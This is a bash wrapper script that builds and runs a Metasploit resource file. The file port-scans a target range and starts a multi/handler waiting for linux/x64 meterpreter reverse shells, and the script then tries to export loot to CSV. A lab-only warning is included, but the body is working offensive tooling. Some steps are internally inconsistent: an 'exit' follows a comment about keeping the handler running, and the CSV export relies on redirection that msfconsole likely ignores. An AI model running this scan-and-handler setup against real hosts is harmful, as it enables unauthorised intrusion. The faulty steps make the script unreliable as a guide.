#!/usr/bin/env bash
# Simple wrapper that builds a Metasploit resource file to:
#  - switch/create workspace "lab1"
#  - run auxiliary/scanner/portscan/tcp against RHOSTS (1-1024)
#  - add a note for the host
#  - export loot (CSV)
#  - start a multi/handler for linux/x64/meterpreter/reverse_tcp
# Usage:
#   ./msf_quick_scan.sh <IP-or-CIDR>         # dry-run (shows what would be run)
#   ./msf_quick_scan.sh <IP-or-CIDR> --execute  # actually runs msfconsole with the resource
#
# IMPORTANT: Only run against lab hosts you own or have explicit permission to test.

set -euo pipefail
IFS=$'\n\t'

if [ $# -lt 1 ]; then
  echo "Usage: $0 <RHOSTS> [--execute]"
  echo "Example: $0 192.168.56.101 --execute"
  exit 1
fi

RHOSTS="$1"
EXECUTE=false
if [ "${2:-}" = "--execute" ] || [ "${2:-}" = "-x" ]; then
  EXECUTE=true
fi

# Configuration you can edit
WORKSPACE="lab1"
PORTS="1-1024"
THREADS="16"
LPORT="4444"
PAYLOAD="linux/x64/meterpreter/reverse_tcp"
OUTDIR="msf_quick_output"
HANDLER_TRANSCRIPT="$OUTDIR/handler_transcript.txt"
AUX_TRANSCRIPT="$OUTDIR/aux_scan_transcript.txt"
LOOT_CSV="$OUTDIR/msf_loot.csv"

mkdir -p "$OUTDIR"

# Build resource file
RCFILE="$OUTDIR/msf_quick.rc"
cat > "$RCFILE" <<EOF
# msf resource for quick scan + handler
workspace $WORKSPACE
use auxiliary/scanner/portscan/tcp
set RHOSTS $RHOSTS
set PORTS $PORTS
set THREADS $THREADS
run -j
back

# add a recon note for the RHOSTS
# Note: -a adds; -t type host; -n name; -d description
notes -a -t host -n "Local-scan-1-1024" -d "TCP ports $PORTS scanned on $RHOSTS"

# export loot as CSV to msf console stdout (we will capture it after)
# note: resource files can't directly redirect the output to a file; we'll run a second non-interactive command to capture loot
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST 0.0.0.0
set LPORT $LPORT
set ExitOnSession false
exploit -j -z
# leave msfconsole running (resource will exit)
exit
EOF

echo "Wrote resource file: $RCFILE"
echo ""
echo "Resource file contents:"
sed -n '1,200p' "$RCFILE"
echo ""

if [ "$EXECUTE" = false ]; then
  echo "[DRY-RUN] To actually run this resource with msfconsole:"
  echo "  msfconsole -q -r $RCFILE"
  echo ""
  echo "After the run, export loot CSV with:"
  echo "  msfconsole -q -x \"loot -t csv > $LOOT_CSV; exit\""
  echo ""
  echo "To start handler and capture transcript in one step (example):"
  echo "  msfconsole -q -r $RCFILE > $HANDLER_TRANSCRIPT 2>&1 &"
  exit 0
fi

# EXECUTE = true -> run the resource file and capture transcripts
echo "[EXECUTE] Running msfconsole with resource file..."
# run aux scan + handler and capture interactive transcript with 'script' to keep formatting
script -q -c "msfconsole -r '$RCFILE'" "$HANDLER_TRANSCRIPT" || echo "[WARN] msfconsole exited with non-zero status"

echo "[EXECUTE] msfconsole run complete. Transcript: $HANDLER_TRANSCRIPT"

# Export loot CSV now (non-interactive)
echo "[EXECUTE] Exporting loot CSV to $LOOT_CSV (may be empty if no loot collected)"
msfconsole -q -x "loot -t csv > $LOOT_CSV; exit" || echo "[WARN] loot export failed or produced no output"

echo ""
echo "Done. Artifacts in: $OUTDIR"
echo " - resource file: $RCFILE"
echo " - msf transcript: $HANDLER_TRANSCRIPT"
echo " - loot csv: $LOOT_CSV"
